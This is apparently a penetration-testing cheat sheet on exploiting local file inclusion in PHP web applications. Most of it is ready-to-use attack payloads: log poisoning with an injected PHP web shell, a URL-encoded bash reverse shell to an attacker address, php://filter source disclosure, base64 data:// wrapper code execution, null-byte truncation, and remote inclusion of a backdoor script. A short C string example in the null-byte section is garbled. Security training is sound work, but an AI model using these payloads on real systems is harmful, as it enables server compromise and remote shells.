### Contaminating Log Files to LFI
```
1.
nc -nv 10.11.0.22 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig

2. User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
http://10.11.0.22/menu.php?file=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

Windows log path:
C:\xampp\apache\logs\

Tricks:
Try also to change / for \  
Try also to remove C:/
```
```
PHP Filters:
Read File: curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
Base64 to bypass firewall etc: curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
Execute code: curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

### Null byte to mark the end of file
```
To write a string in PHP, we simply write
$string = ‘hello’;
Unfortunately, C does not have a string data type. To write a string in C/C++ we must use an array.
Char string[5];
string[0]=’h’;
string[1]=’e’;
string[2]=’l’;
string[3]=’l’;
string[4]=’o’;
string[5]=’\0′;
http://www.bostonwebgroup.com/script.php?file=shell.php%00.dat
```

### PHP wrappers
>When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.
```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

echo -n '<?php echo system($_GET["cmd"]);?>' | base64 (PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==)

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```
>we need to be aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the allow_url_include7 setting needs to be enabled
